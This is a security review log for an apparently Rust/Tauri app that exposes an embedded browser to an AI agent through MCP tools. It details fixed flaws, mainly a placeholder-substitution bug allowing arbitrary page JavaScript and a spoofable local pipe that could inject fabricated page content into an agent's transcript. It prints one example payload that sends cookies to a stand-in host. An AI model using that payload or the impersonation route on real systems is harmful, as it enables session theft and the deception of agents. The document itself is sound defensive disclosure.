# Review round 1 — 13 findings, all resolved (2026-09-08)

Three adversarial lenses (isolation, abstain/IPC, host-lifetime/OS-surface),
two independent skeptics per finding, both defaulting to *refuted* when
uncertain — except isolation findings, held to a normal standard because a
missed hole there costs far more than a wasted edit.

**A flaw in the harness, recorded so it is not repeated.** The survival rule was
`votes.filter(Boolean).every(v => !v.refuted)`, so a finding whose second
skeptic *died* (one hit a schema mismatch then a model refusal) was judged on a
single vote and counted as confirmed. `every()` over a filtered array treats "one
skeptic died" as "unanimous". It should require two votes and report
**unverified** when it cannot get them.

## The critical one: `type_script` gave arbitrary JavaScript in the page

`type_script` assembled its script with three sequential `str::replace` calls in
the order `__CB_GLOBAL__`, `__CB_REF__`, `__CB_TEXT__`. Because the ref was
substituted *first*, a ref whose literal value is `__CB_TEXT__` was emitted as
the string `"__CB_TEXT__"` — and the third replace then rewrote that placeholder
**inside the already-emitted string literal**, splicing the encoded text into a
code position between two quotes. `json_string` escapes `"`, `\`, `<`, `>`, `&`
and the line terminators but **not** `'`, `+`, `(` or `)`, so the text could be a
complete expression:

```js
store.refs.get(""+fetch('//evil.example/?c='+document.cookie)+"")
```

With write consent on an authenticated page that is arbitrary same-origin
JavaScript — cookies and `localStorage` included — and the agent's transcript
shows a *harmless failed click*, because `refs.get` then returns `undefined` and
the script returns its benign "no element under that reference" envelope. Silent
exfiltration, and precisely the capability `tools.rs` says is deliberately absent
by refusing to ship `browser_evaluate`.

Neither existing test could catch it: one tested `click_script` (a single
replace), the other passed a benign ref. **The defect was the interaction between
two arguments, each safe in isolation** — which is the lesson worth keeping,
because it generalises to every multi-placeholder template in this tree.

Fixed by `script::substitute`: leftmost-first, advancing past each needle, so a
substituted *value* is never rescanned. Mutation-checked — restoring the
sequential assembly fails
`a_reference_that_spells_a_later_placeholder_cannot_smuggle_text_into_a_code_position`
by name. Two companion tests: the converse (a typed string spelling an *earlier*
placeholder stays data) and `no_assembled_script_contains_a_raw_placeholder` as
the drift alarm.

## The pipe let any local process impersonate the application

`Listener.pipe` was a free-form string the MCP shim **opened**, and its doc
comment justified that: "carried rather than recomputed from the pid so the name
lives in exactly one place". That reasoning is wrong here. The registry is an
ordinary JSON file under the user's config directory, so any local process that
can write it publishes a pipe of its own under this application's pid and answers
**as the browser** — fabricating page text, console lines and network rows
straight into an agent's transcript. No user click, and the consent model cannot
help because consent is enforced by the application and on that path the
application is never reached.

Fixed with `instances::pipe_name(pid)` as the single rule for the name, derived
from a pid already verified against `exe` for recycled-pid safety. A registry
stating a different name is refused as `InstanceError::PipeNameMismatch` —
**reported rather than silently corrected**, because it is the only visible
symptom of impersonation. That makes six variants, not five; the module docs and
the table in the module header both say five and need updating.

## The rest

* **Rings survived a navigation** (found by two lenses independently): one page's
  console/network log was served as the next page's, *and* consent granted for
  the new page licensed reading the previous page's captured content. `clear_logs`
  now runs on url change, on origin change at load-finish, and in `reset_page`.
  Keyed on the url changing rather than called unconditionally, because one user
  navigation reaches that path up to three times (`load`, wry's navigation
  handler, `PageLoadEvent::Started`) and the later fires would discard rows the
  new document had already logged.
* **A stale `sync()` re-showed the webview after minimize.** `sync` awaits
  `scaleFactor()` and two IPC calls having captured `minimized` at entry, so a
  run that began while the panel was open could land *after* the minimize's own
  run and re-show the page. Because the webview is an OS surface compositing
  above the DOM, that is a window the user cannot dismiss, painted over whatever
  they are reading. Now every run is stamped and abandons its writes if
  superseded — checked before **each** write, since the awaits between them are
  where the state moves.
* **Consent and the read were not atomic** and the script's own `location.href`
  was discarded, so a mid-read navigation reported another origin's text as the
  granted page's. The read now carries `ran_on` and
  `consent::read_ran_on_the_granted_page` compares it.
* **`read_page`'s `truncated`** conflated hitting the element cap with filtering
  invisible elements, so the "the list is CUT" warning fired on almost any real
  page — an honesty signal becoming noise. `truncated` is now the cap alone and
  `render::outline` states the skipped count separately.
* **Network status rendering had the two labels effectively swapped.** A rejected
  `fetch` posts `status: null` and `0` is reachable only from the *success* path
  (`(response && response.status) || 0`), i.e. a resolved opaque `no-cors`
  response. So a completed opaque response read as a failure and a genuine
  failure read as a resource-timing limitation — in the same line saying it was
  observed via a patched fetch. Now branched on `entry.source`.
* **`page_text` claimed "the whole page"** for the top document's `innerText`
  only. Now "the top document's rendered text in full", with a frame-scope note.
* **A webview that failed to be created was recorded as `Blank`**, whose words
  are the positive claim "the panel is open with no page loaded". `note_opened`
  sets that optimistically and a bare `?` on `create` left it standing, so
  `browser_status` asserted an empty panel where there was no webview at all.
  Now `note_failed` on that path, matching what `load` already did.

## Recurring defect worth its own alarm

Collapsed line-continuations inside string literals — `"...text              more"`
with ~18-space holes where a `\` continuation was lost. This has now appeared in
**three** separate rounds (the SQL final gate caught it in `rename.rs`, then here
in `render.rs` and four times in `consent.rs`, including user-facing refusal
prose). `cargo fmt` cannot see it because rustfmt does not reformat string
literals, and no test asserts the prose, so it ships silently.

The sweep that finds it:

```sh
grep -rn '[^ ]   \+[a-zA-Z]' crates/core/src --include=*.rs | grep '"'
```

Worth making a real check rather than a habit.

## Still unverified

* **DPI scaling.** The spike ran at scale factor 1.0, so logical-vs-physical
  bounds are untested. A HiDPI monitor is an open risk.
* Nothing has been exercised in the running app since the panel step: no
  end-to-end navigation, console/network capture, or feature-off teardown.
* The live isolation check — `window.__TAURI_INTERNALS__` undefined in a real
  page — was **observed in the spike** but not re-confirmed against the
  production host. Verifying by reading that the host builds its webview the same
  way the spike did is the gate before shipping.
